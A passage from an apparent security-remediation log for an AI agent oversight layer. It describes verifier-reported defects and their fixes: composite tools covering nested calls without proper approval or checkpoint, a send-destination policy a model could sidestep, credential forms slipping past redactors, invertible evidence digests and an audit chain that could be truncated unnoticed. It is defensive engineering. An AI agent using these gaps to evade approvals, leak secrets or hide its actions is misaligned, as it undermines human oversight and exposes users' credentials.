  [A-Za-z0-9+.-]*://`, a run holding a letter); a JWT from the start of a
  run of base64url characters to its first `eyJ` at a word boundary (the
  run's start or after `-`), the refusal shape to its first `eyJ`; and a PEM
  header with no end after it matches the rest of the text with no
  `secret` group, which replaces nothing (`_replace_secret` and
  `replaceSecrets` keep such a match). A differential run of the old and
  new patterns on 200,000 to 300,000 random strings over each pattern's
  alphabet found no difference, but one in redaction: the URL rule now
  reads a scheme whose run starts with `_` or a digit before its letter
  (`x_https://u:pw@h`), which the old `\b` skipped, so redaction replaces
  that password too (a superset; the refusal rule already read it).
  Measured after: 1 MB of each adversarial shape in 0.1 to 0.6 s per call
  (`holds_credential`, `redact_text`, `holds_secret`), linear in a fuzz of
  every pattern over pairs of 40 atoms.
- The shell scan (`secret_scan.sh`) uses `grep -E`, which GNU grep runs as
  a DFA: 1 MB of each shape in 0.03 to 0.17 s, so it is unchanged.
- Tests: `tests/test_redaction.py::test_a_long_text_is_read_in_time_in_proportion_to_its_length`
  (twelve 1 MB shapes through `holds_credential`, `redact_text` and
  `holds_secret`, under 20 s; the old patterns ran past 100 s on `eyJ-`) and
  `test_the_patterns_read_a_run_once_and_match_as_before`; the same in
  `packages/acs-core/test/redact.test.ts` (the old patterns held the event
  loop past 110 s); vectors `url_userinfo_scheme_in_a_word` (failed on both
  old redactors), `jwt_after_dash` and `pem_header_without_end` (pins of
  the rewrite) in `tests/conformance/secrets/redact.json`.

#### 30. A composite's approval covered nested calls needing more (medium)

`groundedTool` took a composite's approval policy from its own options, so
bob, holding no role, approved `batch` once and its nested `write_prod`
(`role: admin`, two approvers, 60 s expiry) ran covered; a decision two
hours old covered it; through `outer` likewise. The adapter gave `batch` no
approval policy at all, so one permission prompt ran a binding it can never
allow directly.

- Fix (Standard §5.18.4, a new bullet): a composite's approval covers a
  nested call only as a decision valid for the nested binding's approval
  too, so a composite's call asks for the strictest of its own and,
  transitively, each binding it lists (the most `min_approvers`, the
  shortest `expires`, a `role` one of them sets, its own first); a layer
  that attributes a nested call the composite's decisions do not meet
  checks it as a call of its own.
  - Python (`bindings.py`, `join_approval`): `load_bindings` joins
    `ToolMapping.approval` transitively, through mappings known from
    earlier loads; the adapter's existing rules then refuse a composite
    that reaches two approvers or a role (F502) and apply the shortest
    expiry.
  - TypeScript package (`joinApproval`): `checkBindings`' effective
    `approval` is the same join.
  - Binding: the composite's policy is the join (`POLICY` per tool, a
    record's approval for a plain tool); the nesting token carries the
    request whose decisions approved the composite (its own, or the one
    that covered it), and a nested call is covered only when
    `decisionsCover` finds them valid for its own policy at the call (the
    role the request was asked under, enough distinct approvers counted
    within the shorter expiry). `requestApproval` starts a new round when
    the live request was asked under a weaker policy than the call's (a
    request a host made with `{}`, or one made before the join), so
    decisions given under the weaker one decide nothing.
- Tests: call fixture `composite_takes_invoked_approval` (31 fixtures; one
  approver for a composite whose invoked binding needs two: F502 on both
  layers, both routes of the adapter; failed on both old layers);
  `tests/test_tool_bindings.py::test_a_composite_takes_the_approval_of_its_invokes_transitively`;
  the `checkBindings` join test in `packages/acs-core/test/bindings.test.ts`;
  `test/nesting.test.ts`: the role, approvers and expiry asked of
  `batch` and `outer` (bob's `{}` request refused, bob not allowed to decide
  the joined one, two admins run it covered) and a nested call checked on
  its own (an `ops` composite, and an admin approval lapsed by the nested
  call): 2 failed before.

#### Siblings checked

- Plugin hooks: the pre-tool-use hook gates every Write, Edit, MultiEdit and
  NotebookEdit as `mutate` whatever the persist hook reads; unchanged.
- The audit skill's Edit hook refuses any edit of the records file, so it
  needs no after-the-call scan.
- Python adapter: nested calls are never seen; a composite reaching a send
  under a policy is refused and an unbound invoked name is V107 (batch 3),
  so #27 has no sibling there; #28's profiles are layer-wide already.
- `persistEntry` and the Python memory store scan before their size check
  (the vectors pin `secret_in_data` first); with linear patterns 1 MB takes
  under a second, so the order stays.

#### Documentation

Standard §5.18.4 (the approval bullet); SECURITY.md (§5.4 persist rows and
matcher, the redaction bullet, the class SL paragraph); the binding's
statement (`covers`, `does_not_cover`); the Standard Agents guide (sends and
memory, composites, `profiles`); the SDK guide (a composite's approval);
hooks/README and the persist skill (what the hook scans); the module
docstrings of the redactors, `layer.ts`, `memory.ts`, `grounded.ts` and
`approval.ts`; CHANGELOG (Upgrading: SDK, redaction, plugin persist hook,
`checkBindings`, binding composites and profiles; the fixture count). No
version changes.

#### Checks after batch 5

The batch was finished in a second session (the first was cut off after
changing code): the uncommitted changes were reviewed against the five
defects, the tests were run again on the old hook body, binding sources and
loaders (28 hook cases plus the 2 NotebookEdit matcher cases, and 9 binding
tests, failed), the healthcare profile was run through `memoryTools` on the
real WebAssembly core (persist and recall F502 with `person_required`, both
from the tool's own profiles and the layer's), and the persist row of
SECURITY.md §5.4 now states what the scan does not read.

- Python: `pytest tests/` (5246 passed, 18 skipped); ruff check and format
  with CI's lists; mypy; every `tools/validate_*.py` of CLAUDE.md,
  `validate_workflows.py --strict` and every domain catalog and example
  `--strict`; the generators' `--check`; `scripts/run_conformance.py`.
- Rust: no Rust source changed, so `cargo test` was not rerun.
- TypeScript: `packages/acs-core` build, check, test (1896; the
  WebAssembly build reused); the binding's check and test (201, 2 skipped).
- Site: `npm run check`, `npm test` (1173), `npm run build` (check-dist
  passed); `check-runs.mjs` on `/spec/1.2.0/` and `/guides/claude-agent-sdk/`
  with the 1248 headless shell (CI pins 1254): longest enforced runs 1795
  and 1798 px, in §4.4 and the SDK guide's evidence stores, neither a part
  this batch changed.
- Probes: none left running.

### Batch 6: five reported defects

Security round 1's sixth batch: five defects an independent verifier
reproduced on 99c37dd, four in the Standard Agents binding and one in the
redactors and refusal rule of both SDKs and the plugin's scan. Each was
probed again on cb054f6 (batch 5) before it was fixed: batch 5 had closed
the reported case of #31 (a copy of a profile-gated tool listed in
`invokes` now loads as a plain tool whose nested call the wrapper of the
tool the runtime runs checks on its own, F502/F501; the verifier's cases A
to G and the decorator C all refuse), but not its root: a nested call
needing a checkpoint and no approval, run under a listed name by a tool
other than the one listed, was still covered by a composite that used no
checkpoint. #32 to #35 reproduced as reported. Each fix has tests that fail
on the code before it (run with the old binding sources, redactors, shell
scan and evidence store: 13 binding tests, 5 of them only because their
tool now passes the option's new pointer form; the new call fixture on the
binding; 24 Python and shell tests; 6 TypeScript redaction vectors and 2
binding memory tests; the rest are controls that pass on both).

#### 31. A nested call was covered whatever the composite's call held (medium)

The nesting token named the composite, its approval request and whether a
person approved it, and `check` skipped both gates for the call that took
it. The runtime runs whatever tool it knows under the invoked name, so the
composite's own flags (which include the listed tool's) prove nothing
about the tool that takes the token. On cb054f6: `batch` (`invoke`) lists a
harmless `retrieve` tool under `deploy`, the runtime's `deploy` declares
`requires_checkpoint`, and the nested call ran with no checkpoint, covered
by a call that used none. Batch 5's join made the approval half hold
(`decisionsCover` needs the composite's decisions), not the checkpoint
half.

- Fix (`grounded.ts`): the token carries `checkpoint`, whether the
  composite's call used a checkpoint (its own, or the covering call's,
  transitively); a nested call that needs one is covered only when it did,
  beside the approval and person conditions; otherwise it is checked as a
  call of its own (its own approval request and checkpoint). The claim
  records `checkpointed` for the composite's own nested calls. Plain tools
  listed in `invokes` need no change: their binding is the listed object's,
  which the composite's flags already join, so the composite always held
  what they need.
- Tests (`test/nesting.test.ts`): a nested call that needs a checkpoint,
  under a name the composite lists for a harmless tool, is refused F501
  when the composite used none and, with a checkpoint of its own, runs
  uncovered (failed before); control: the composite that lists the real
  tool needs a checkpoint and covers the call.
- Standard §5.18.4: the composite's approval and checkpoint cover a nested
  call as far as its call held them; a layer whose composite's call did not
  hold what the nested call needs checks it as a call of its own.

#### 32. Header credentials as name/value pairs or tuples were neither redacted nor refused (medium; sibling of round 1 C's structured headers)

A secret member was an object member whose own name ends in a credential
or header name. A HAR's `[{"name": "Authorization", "value": "Basic
..."}]`, a `[["X-Api-Key", "..."]]` tuple and a HAR's `cookies` array
passed both redactors and the refusal rule (persist stored them; the
evidence collector exported them). In text, the header rule needs `:` or
`=` after the name, so the same JSON text passed too.

- Fix (`redaction.py`, `redact.ts`, identically): an object whose `name`,
  `key` or `header` member (any case) holds a secret member's name makes its
  `value` member secret; a two-element array whose first element is one
  makes its second secret; `cookies` joins the member names. Redaction and
  `holds_credential`/`holdsCredential` (the data rule) apply it. A text
  pattern redacts the value after a quoted secret name and `, "value":`, or
  after `[`/`(` and a quoted secret name and a comma (four characters or
  more, after a scheme); the refusal rule takes such a value of 8 or more
  token characters mixing letters and digits, a tuple in text only when it
  closes after two elements (a list of field names is not one). The
  plugin's `hooks/secret_scan.sh` (and its copies in the `persist` and
  `audit` skills) gains the same text rule. Each attempt starts at a quote
  or bracket and reads to the next, so 1 MB of each new shape takes under
  2 s in Python and the shell scan 0.1 s.
- Sibling (Python evidence store): `_sanitize_metadata` turned metadata
  nested deeper than two levels into `str(value)[:100]` before the store
  redacted it, so the pair's repr reached the export, and a cut could keep
  part of a secret (a registered one, or a token cut below its pattern's
  length). Such a value is now its JSON text, redacted with the default
  patterns while its structure can be read, and whole (the 1 KB limit
  replaces a value too large whole; a reference cycle becomes
  `"[unserializable]"`). The delegation anchor's `description` and the
  orchestration anchor's `task_goal` were cut at 100 characters before the
  store redacted them; they are kept whole.
- Tests: vectors `har_header_pairs`, `pair_name_members`, `header_tuples`,
  `har_cookies`, `pair_in_text`, `tuple_in_text` in
  `tests/conformance/secrets/redact.json`, and `pair_member`,
  `tuple_member`, `pair_placeholder`, `pair_other_header`, `pair_in_text`,
  `tuple_in_text`, `name_list_in_text` in `credentials.json` (the text ones
  run through the shell scan under sh and bash);
  `tests/test_memory_store.py` (`header_pair`, `header_tuple`),
  `tests/test_tool_call_approval.py::TestEvidenceToolInput::test_header_pairs_in_the_input_are_redacted`,
  the binding's `test/memory.test.ts` (both forms refused by
  `persistEntry`), and five new 1 MB shapes in the timing tests of both
  SDKs. 24 Python and shell tests and 6 TypeScript vectors failed before.
- Not read (stated in the redactors' docstrings): a pair whose `value`
  comes before its name in text, a flat `[name, value, name, value]` list
  (Node's `rawHeaders`), and a `Cookie:` header line in text.

#### 33. A composite's state issued nesting tokens after its call ended (medium)

`nestingState` returned a proxy whose `invokeTool` minted a token on every
call, with nothing marking the composite's call as over. Code that kept the
state (or another tool it was handed to) invoked a listed tool later in the
execution, and the call was covered by the composite's spent approval and
checkpoint, past the checkpoint's age too; an invocation the composite did
not wait for was covered after its call was recorded complete.

- Fix (`grounded.ts`): a `CompositeScope` (`open`) that `execute` clears in
  a `finally` once the composite's own code settles. An invocation through
  the state after that is refused with F504 and recorded `refused` with no
  `covered_by` (a plain tool it reaches has no wrapper to check it as a
  call of its own); the check is made again after the digest is computed,
  before a token is issued, and before a plain tool's runtime call (a
  `started` entry is then completed `refused`); `findToken` honours a token
  only while its scope is open, so an invocation started in time whose tool
  checks after the composite returned is checked as a call of its own.
- Tests (`test/nesting.test.ts`): a kept state's invocation is refused F504
  without reaching the runtime, recorded with no `covered_by`; an
  invocation the composite did not wait for is checked on its own (F502):
  both failed before. Test (f) of the nesting tokens (no token left once
  the composite returns) still passes.
- Standard §5.18.4: a call made through the composite once its call has
  ended is no nested call; a layer checks it as a call of its own, or
  refuses it (F504).

#### 34. A send tool without the destination option was checked at args.destination (low)

The binding read a `send` tool's destination from `args.destination` when
the tool did not say where. Under a policy, a model could set
`destination` to an allowed value while the tool's code sent to `url`
(with a passthrough or record schema). The record (the annotation)
declared no pointer, and §5.18.1 gives none by default; the Python adapter
refuses such a binding under a policy ("cannot tell where").

- Fix (`grounded.ts`): no default. The `destination` option is an RFC 6901
  pointer (new; stated in the annotation as the record's `destination`,
  and refused at definition when it is not a pointer) or a function. A
  `send` tool defined without it has a destination the layer cannot tell,
  so while any policy is in force every call is refused with F504 before
  approval and the checkpoint. With no policy nothing changes. The call
  fixtures' runner now passes the record's pointer itself.
- Tests: call fixture `send_destination_unknown_under_policy` (32 call
  fixtures: a `post` binding with no destination, called with an allowed
  `destination` argument, F504 on both layers; failed on the old binding,
  passed on the adapter); `test/layer.test.ts` (the verifier's
  `post_webhook` refused and its code not run, the annotation's pointer,
  a non-pointer option throwing).
- Docs: the guide's sends section and the binding README no longer say a
  tool without the option obeys the policy by `args.destination`.

#### 35. The audit hook's own entries were redacted without the host's secrets (medium)

`recordToolCall` wrote its entry for a plain tool's call with the default
patterns only: a host's own secret in the error (`upstream rejected api key
<secret>`) reached the trace, which `actionRecord` exports as an audit
record. Secrets could be registered only per grounded tool.

- Fix: `configureLayer({ secrets })` registers the host's secrets
  layer-wide (`layerSecrets()`); `records.ts` redacts every entry with them
  beside the writer's own, so the audit hook, a control tool, the nesting
  state and every grounded tool use them; a grounded tool's
  `persist`/`audit` refusal and `persistEntry` refuse them too.
  `recordToolCall` takes an optional `{ secrets }`. The secrets are not
  part of `config_sha256` (§6.7: no digest of a secret alone).
- Tests (`test/layer.test.ts`): the hook's entry for `crm_sync` redacted
  with the layer's secrets and with its own, a grounded tool's entry and
  `persistEntry` refusing the layer's secret, and the option's validation:
  3 failed before.
- Python sibling: none; `GroundedAgentConfig.secret_values` already reaches
  the adapter's redactor, its evidence store and the coordination audit log.

#### Siblings checked

- The other `appendTrace` writers (the not-listed refusal, the plain
  path, `controlTool`) now get the layer's secrets through `records.ts`.
- The adapter never sees nested calls (#31, #33 have no Python sibling); it
  already refused a send binding with no destination pointer under a policy
  (#34), which the new fixture now pins for both layers.
- `persistEntry` and the Python memory store use the refusal rule, so #32's
  pair rule reaches both.

#### Documentation

Standard §5.18.4 (the nested-call bullet); SECURITY.md (§1.5 bullets, the
audit hook row of §5.4, the class SL paragraph); the binding's statement
(`covers`: while the composite runs); the Standard Agents guide (secrets,
sends, nesting tokens and the run's end, the `secrets` option, the
guarantees row); the binding README; the persist skill's text; the
redactors' docstrings; CHANGELOG (Upgrading: secrets as pairs, evidence
metadata, the binding's sends, composites and secrets; the fixture count).
No version changes.

#### Checks after batch 6

- Python: `pytest tests/` (5281 passed, 18 skipped); ruff check and format
  with CI's lists; mypy; every `tools/validate_*.py` of CLAUDE.md,
  `validate_workflows.py --strict` and every domain catalog and example
  `--strict`; the generators' `--check`; `scripts/run_conformance.py`.
- Rust: no Rust source changed, so `cargo test` was not rerun.
- TypeScript: `packages/acs-core` build, check, test (1917; the WebAssembly
  build reused); the binding's check and test (213, 2 skipped).
- Site: `npm run check`, `npm test` (1173; the new call fixture counts once
  tracked), `npm run build` (check-dist passed); `check-runs.mjs` on
  `/spec/1.2.0/` and `/guides/claude-agent-sdk/` with the 1248 headless
  shell: longest enforced runs 1795 and 1798 px, as before (§5.18.4's
  bullet grew by five lines inside a shorter run).
- Probes (the verifier's, pointed at this worktree): every late invocation
  of `p4_late_invoke` and `p34_variants` (later in the step, an hour later,
  through a helper tool, not awaited) is refused F504 and writes nothing,
  while the composite's own nested call is still covered; `post_webhook` is
  refused F504 with every schema; `v32`'s cases all refuse; the shipped
  audit hook, with the secret registered by `configureLayer({ secrets })`,
  redacts all four phrasings; `redactJson`, `holdsCredential` and
  `redactText` redact and refuse the HAR and tuple forms. None left running.

### Batch 7: five reported defects

Security round 1's seventh batch: five defects an independent verifier
reproduced on 99c37dd, one in the Standard Agents binding's approval
records, three in what the Python SDK and the binding write into records
(§6.7), and one in the time the redactors take and the adapter's hook
matcher. Each was probed again on 69b2d3a (batch 6) before it was fixed.
Two were already closed there: #36 by batch 5's #30 (`requestApproval`
opens a new round when the live request was asked under a weaker policy),
and the regex half of #40 by batch 5's #29 (with batch 1's #9 for
`on_failure="block"`); for both, the verifier's probes now refuse, and the
tests below pin them. #37 to #39 reproduced as reported. Each new test
fails on the code before its fix (run with the old binding source, the old
redactors, audit log, trust module, runner and adapter: 15 Python tests,
4 TypeScript vectors, 2 binding tests; the bounded-time test, run with
99c37dd's redactor, gave no decision within 100 s; the rest are controls
that pass on both).

#### 36. An approval request kept the policy it was made under (medium; closed by batch 5)

On 99c37dd a request a tool made under `approval: {}` was decided by bob,
who holds no role, after the deployment redefined the tool with
`{min_approvers: 2, role: 'admin', expires_ms: 60000}` (thread values
outlive a redeploy), and the new definition's call ran on it; one approved
with no expiry stayed usable a month after an expiry was added. Batch 5's
#30 made `requestApproval` keep a live request only when it was asked under
a policy at least as strict as the call's (`asStrictAs`: as many approvers,
the same role when the call's sets one, an expiry no longer than its own),
and otherwise close it into `history` and open a new round under the call's
policy, so decisions given under the weaker one decide nothing; the call
then counts the new round's decisions against that round's policy, which is
the call's or stricter. The verifier's probe (cases A to D, the
`approvals.post` endpoint included) now refuses each call with F502; bob's
decision is still accepted on the closed round, which no call uses.

- Test (`test/grounded.test.ts`, "decides nothing with a request asked
  under a weaker policy than the tool has at the call"): the pending request
  decided after the change (round 2 opened under the new policy, bob
  refused on it), the approved request a month later (F502, nothing
  executed), and a control (a request asked under a stricter policy stays
  and its admins' decisions run the call). It fails with `asStrictAs`
  removed from `requestApproval`, the code before batch 5.
- Python sibling: none; the adapter keeps no approval request across calls
  (its permission prompt decides one call), and a run's approval policy is
  its catalog's.

#### 37. Evidence anchors kept the digest of content whose secret they redacted (medium)

`Redactor.redact_anchor` replaced a secret in an anchor's `ref`, `excerpt`
or metadata and kept its `digest`; the binding's trace did the same
(`redactJson` over `evidence_anchors`). With `DB_PASSWORD=[REDACTED]\n`
beside the digest of `DB_PASSWORD=sunshine42\n`, 343 guesses recovered the
password; with a registered secret quoted whole, the record held the
digest of the secret alone, which §6.7 forbids outright. The collector
already dropped the digest of a response holding a secret; anchors a host
supplies (a runner `Output`, a grounded tool's output, a direct append)
did not get that rule.

- Fix (`redaction.py`, `redact.ts`, identically): an anchor redaction
  changed keeps no digest of what it cites: its `digest` and its
  metadata's `hash` go, and its metadata says `digest_omitted: "secret"`
  (only when one was dropped). Python: `Redactor.redact_anchor` (both
  evidence stores) and `Redactor.redact_anchor_data`, the same rule on an
  anchor's JSON form; TypeScript: `redactAnchor`, which the binding's
  `redacted()` applies to each anchor of every trace entry (the
  notification and `exportEvidence` read the stored entry). An anchor with
  no secret keeps its digest.
- Tests: six vectors with `anchor: true` in
  `tests/conformance/secrets/redact.json` (an excerpt, a registered secret
  alone, a ref with a metadata `hash`, a secret in metadata only, a secret
  with no digest, and a control), run by both vector runners through
  `redact_anchor`, `redact_anchor_data` and `redactAnchor` (4 failed on both
  old redactors); the binding's `test/evidence.test.ts` ("keeps no digest of
  what an anchor that held a secret cites": the trace, the notification and
  the export; failed on the old `records.ts`). The verifier's `p7_digest.py`
  and `p_alone.py` now find no digest to invert.

#### 38. The coordination audit log redacted only `details` (medium)

`CoordinationAuditLog.record` redacted `details` and kept `intent` and
`evidence_refs` as given, so an `audit` step's event intent (or event type),
an anchor ref shared through `CrossAgentEvidenceBridge` and a delegate's
anchor refs at `complete_task` (an S3 presigned URL's
`X-Amz-Credential=AKIA...`) reached the action record and `to_dict` with
the secret that the same record's `details` held redacted.

- Fix (`coordination/audit.py`): every value an event keeps is redacted
  before the event is kept: `details`, `intent`, each `evidence_refs` item,
  the event type, the agent ids and the capability; the debug log line
  names the redacted values.
- Sibling: `trust.manual_override` (and `TrustModel.manual_override`) built
  an action record from its target, values and anchors and handed it to
  the host's `record` unredacted; it now redacts the record with a
  `redactor` (new optional argument, default patterns), each anchor as a
  store keeps it (`redact_anchor_data`).
- Tests: `tests/test_redaction.py::test_coordination_audit_log_redacts_every_member`
  and `::test_coordination_records_redact_intent_and_evidence_refs` (the
  audit step by intent and by event type, `share_evidence`, `complete_task`
  with a presigned URL; both failed before);
  `tests/test_audit_records.py::test_manual_override_records_no_secret`
  (failed before).

#### 39. The runner redacted only an Error's message (medium)

`WorkflowRunner._redact_error` redacted `message` and passed `reason`
through; the core traces a reason outside the token grammar as
`reason_ignored`, so `HostCannotServe(f"backend {dsn} unreachable")` (its
first argument doubles as the message) left the DSN's password in the
trace and the snapshot beside its redacted copy in the message, as did a
`reason` object. The `Error` the runner built when the run refused a host's
response (`the host's response was refused: <the core's error>`, which
repeats the value refused) was submitted unredacted, so a malformed
`evidence_seen` holding a bearer token reached the trace, the result, the
run record and the snapshot.

- Fix (`runner.py`): `_redact_error` also redacts `reason` (a string as
  text, any other value as JSON; a token is unchanged), and `_submit`, now
  an instance method, passes its fallback `Error` through it.
  `_cannot_serve`'s `Error` goes through `_redact_error` with every other
  response.
- Not changed: the core keeps `reason_ignored` as the host gave it. It
  keeps a host's `message` as given too; §6.7 puts both on the host, and
  the runner, the SDK's host side, now redacts both.
- Test: `tests/test_runner.py::test_no_secret_in_a_failed_step` (free-text
  `HostCannotServe`, a text reason, a reason object, and malformed
  `evidence_seen` as a header and as a URL; the trace, the result, the run
  record and the snapshot): all 5 failed before. The verifier's probe
  finds no leak in any of its nine modes.

#### 40. Quadratic redaction patterns held the adapter's hook past its time limit (medium; closed by batches 1 and 5)

On 99c37dd the URL patterns read a long run again from each position
(`holds_credential` of 256 KB of `a`: 100 s), so the adapter's PreToolUse
check of a TodoWrite (persist) with 290 KB of padding before an AWS key took
64 s, past the SDK's 60 s, and its matcher had no `on_failure`, so the CLI
ran the call. Batch 1's #9 set `on_failure="block"` on the safety matcher
and batch 5's #29 made every pattern read a run once. Measured on this
tree (each under `timeout 120` and a 4 GB limit): Python
`holds_credential` of 1 MB of `a` 0.82 s, of hex 0.66 s, `response_digest`
of 1 MB of `a.` 0.21 s; TypeScript `holdsCredential` and `redactText` of
1 MB 0.02 to 0.07 s; the adapter's hook denies the verifier's TodoWrite
with 290 KB of padding in 0.1 s and 1 MB in 0.4 s.

- Change (`adapter.py`): the safety matcher states its time limit,
  `timeout=SAFETY_HOOK_TIMEOUT_S` (60 s, the SDK's default, so a change of
  the default does not change it), where the SDK's `HookMatcher` has the
  field; the dict form carries it too. No cap on the text a check reads: a
  check that outlived the limit blocks the call (`on_failure="block"`).
- Tests (`tests/test_pretooluse_hooks.py`): the matcher's `timeout` and the
  dict form (both failed on the old adapter), and
  `test_a_long_input_is_decided_well_within_the_time_limit` (the
  verifier's TodoWrite with 1 MB of padding is F504 within 10 s; with
  99c37dd's redactor it gave no decision within 100 s). The 1 MB shapes of
  both redactors' timing tests (batch 5) already cover `a`, hex and `a.`.

#### Siblings checked

- The binding's `args_digest` is of a call's whole arguments, which no
  record holds beside it (§6.7 allows the digest of a whole value); the
  plugin's audit log likewise keeps only `input_sha256`.
- The adapter's call records redact their details; the orchestration and
  delegation anchors go through the store's `redact_anchor`, so #37's rule
  reaches them.
- The binding has no runner; the TypeScript package's `Run.submit` passes
  a host's response to the core as the host gives it (§6.7's duty stays
  the host's).

#### Documentation

SECURITY.md (§1.5: the redaction bullets, the anchor digest rule, the time
limit; the class SL paragraph: the adapter matcher's timeout); the SDK
guide (secrets, the CLIConnectionError note); the runner guide (`reason`
redacted, `reason_ignored`); the Standard Agents guide (secrets); the
`acs-core` README (`redactAnchor`); the redactors', stores' and audit
log's docstrings; CHANGELOG (Upgrading: the adapter's matcher timeout,
anchors that held a secret, coordination records and `manual_override`,
the runner's `reason`, the binding's secrets). The Standard's §6.7 already
forbids each leak; no change there. No version changes.

#### Checks after batch 7

- Python: `pytest tests/` (5296 passed, 18 skipped); ruff check and format
  with CI's lists; mypy; every `tools/validate_*.py` of CLAUDE.md,
  `validate_workflows.py --strict` and every domain catalog and example
  `--strict`; the generators' `--check`; `scripts/run_conformance.py`.
- Rust: no Rust source changed, so `cargo test` was not rerun.
- TypeScript: `packages/acs-core` build, check, test (1923; the WebAssembly
  build reused); the binding's check and test (215, 2 skipped).
- Site: `npm run check`, `npm test` (1173).
- Probes (the verifier's, pointed at this worktree, each under `timeout
  120` and an address-space limit): `v37` cases A to D refuse with F502;
  `p7_digest.py`, `p_alone.py`, `probe_anchor.mjs` and `probe_alone.mjs`
  find no digest; the coordination repros find no key in any record; the
  runner probe finds no leak in its nine modes; `p10_hook.py` denies at
  16 KB to 1 MB of padding in at most 0.4 s. None left running.

### Batch 8: three reported defects

Security round 1's eighth and last batch: three defects an independent
verifier reproduced on 99c37dd, one in the redactors and refusal rule of
both SDKs and the plugin's scan, one in the plugin's audit log, and one in
the Standard Agents binding's audit hook. Each was probed again on 8a913da
(batch 7) before it was fixed. Of #41, the header name/value objects and
`[["Cookie", ...]]` pairs in data were already closed by batch 6's #32
(redacted and refused in both SDKs; the verifier's `p1.py` now shows
them so); every other case reproduced as reported, and so did #42. Of #43,
batch 6's #35 had added `configureLayer({ secrets })`, but the
registration the report names, a grounded tool's own `secrets`, still did
not reach the audit hook's entries: the verifier's `probe46` stored the host
key in the hook's entry. Each new test fails on the code before its fix
(run with the old redactors, shell scan and skill copies: 64 Python and
shell tests and 34 TypeScript vector tests; with the old redactor: the 3
new runner cases; with the old log hook,
verifier and pre-tool-use hook: 7 head tests and 3 guard cases; with the
old binding: 2 tests; the pinned-forms tests call a function the old code
does not have).

#### 41. Common credential forms passed the redactors and the refusal rule (medium)

Unchanged by both redactors and not refused by `holds_credential`,
`holdsCredential` or `secret_in` (identical results): a URL's userinfo with
an empty user's name (`redis://:<password>@`, Redis's form; the user part
was `[^/:@]+`), an assignment in escaped JSON text (`curl -d
"{\"password\": \"...\"}"`, an AWS `SecretString`; only `["']?` was read
around the name), `curl -u user:<password>` (also as an exception's
`['false', '-u', 'admin:...']`), `SECRET_KEY=`, `DJANGO_SECRET_KEY=`,
`{"secret_key": ...}` and `{"passphrase": ...}`, and a registered value
percent-encoded or JSON-escaped (only the verbatim form was replaced). End
to end, `WorkflowRunner` kept the password in the message and the trace for
the empty-user URL, the `CalledProcessError` text and the escaped JSON.

- Fix (`redaction.py`, `redact.ts`, `hooks/secret_scan.sh` and its copies
  in the `persist` and `audit` skills, identically):
  - the userinfo rule takes an empty user's name (`[^/:@]*`);
  - a quote around a credential name or value may be escaped (`\\*["']`),
    in the assignment, `Authorization`, pair and tuple rules of redaction
    and refusal; a value ends at an escaped quote, so the escapes around
    the marker stay (a value character is not a backslash, or is a run of
    backslashes no quote follows, read once);
  - new rules for a command's user option (`-u`, `-U`, `--user`,
    `--proxy-user`; the value after blanks, `=`, attached to `-u`, or as a
    list's next item) and for an option named for a credential with its
    value after blanks or as a list's next item (`--password <value>`, not
    a value that starts with `-`). Redaction replaces the password or value
    (4 characters or more); the refusal rule takes a user option's password
    of 8 or more characters mixing letters and digits (so `docker run -u
    1000:1000` passes) and a credential option's value as an assignment's
    (quoted, 8 or more; unquoted, 12 or more mixing letters and digits);
  - `passphrase` and `secret[_-]?key` join the credential names (text and
    JSON members);
  - a registered value is registered in the forms text carries it in:
    `encoded_forms` / `encodedForms` (new, exported) give, in one order, the
    value, its JSON-escaped forms (non-ASCII as it is and as `\uXXXX`, each
    with `/` as `\/`, and the first two escaped again) and its
    percent-encoded forms (UTF-8; RFC 3986's unreserved characters kept,
    with `/` too, with `!*'()` too as `encodeURIComponent` keeps them, and
    the two form-body encodings with `+` for a space; upper- then lower-case
    hex). `Redactor.add_secret` and the package's `registered` add them all;
    replacement and refusal then see them as they see the value.
- Sibling: the runner, the evidence stores, the coordination audit log, the
  adapter and the binding's trace and memory all redact and refuse through
  these redactors, so they take each change; `GroundedAgentConfig.
  secret_values` and the binding's `secrets` register the encoded forms.
- Not read, stated in both redactors' docstrings and SECURITY.md: a
  password attached to a short option with no name (`mysql -p<secret>`;
  `-p` means too much else) and a secret in base64 or another encoding
  unless the host registers that form.
- Tests: 13 vectors in `tests/conformance/secrets/redact.json` (empty-user
  URL, escaped JSON once and twice, an escaped `Authorization` header and
  pair, user options, a user option as list items, a credential option,
  one before another option and options that take no password as
  controls, `SECRET_KEY` and `passphrase` in text and as members, encoded
  and non-ASCII registered values) and 17 in `credentials.json` (with
  controls: an empty-user placeholder, `docker run -u 1000:1000` and `git
  push -u`, credential options in prose, `secret_key: see the vault`), run
  by Python, the TypeScript package and the shell scan under sh and bash;
  `tests/test_runner.py::test_no_secret_in_a_failed_step` gains the three
  end-to-end cases; the pinned forms in `tests/test_redaction.py` and
  `test/redact.test.ts` (each checks the standard library's or the
  platform's encoders' output is among them, and that it is redacted and
  refused); 11 new 1 MB shapes in both timing tests (backslash runs,
  escaped pairs and tuples, `a://:`, `-u`, `'-u', '`, `-ua:`, `--a-`,
  `--password`). Measured: Python at most 2.1 s at 1 MB, TypeScript 0.3 s,
  the shell scan 0.2 s.
- Parity: 4000 fuzzed strings over the new tokens give the same redaction,
  pointers and refusal in Python and TypeScript (0 differences), and 1094
  single-line ones the same refusal in Python and the shell scan under bash
  and sh.

#### 42. The audit log's chain did not show its last entries removed (low)

`tools/verify_audit_log.py` checked each entry and its link to the one
before; nothing anchored the end, so `head -n 2` of a three-line log
verified (2/2), as did a log whose last line was deleted and to which the
hook then chained the next call, or a log removed and begun again. The
hook's comment claimed that deleting any entry invalidates all later HMACs.

- Fix: the log hook keeps the chain's end in `.claude/audit.head`, one line
  of JSON: `entries` (the log's line count), `hmac` (the last line's) and
  `head_hmac`, the HMAC of `acs-audit-head:<entries>:<hmac>` under the
  log's key. Under the log's lock, before it appends, it checks that the
  log still holds the head's entry at its place; after it appends, it
  writes the head for the log's end as it then is (to a file it creates
  with noclobber, renamed over the old one). A log that no longer holds the
  head's entry, or a head another key signed, is reported (exit 1, the
  line still written) and the head is kept: it is the evidence of the cut,
  at every later call, until a person moves both files aside. A log with no
  head (begun before the hook kept one) is anchored from that line on,
  reported once. A head behind the log (a run that appended and could not
  write it) still anchors it. The verifier reads the head beside the log
  (`<log>.head`; `--head-file` names another) and fails a log that ends
  before it, holds another entry at its place, or has no head (`--no-head`
  checks the chain alone: a log begun before the head, and the audit
  skill's `records.jsonl`). `verify_log` takes the head as an optional
  argument. The pre-tool-use hook's records guard refuses a call that names
  `audit.head` (F504), as it refuses one naming the checkpoint records.
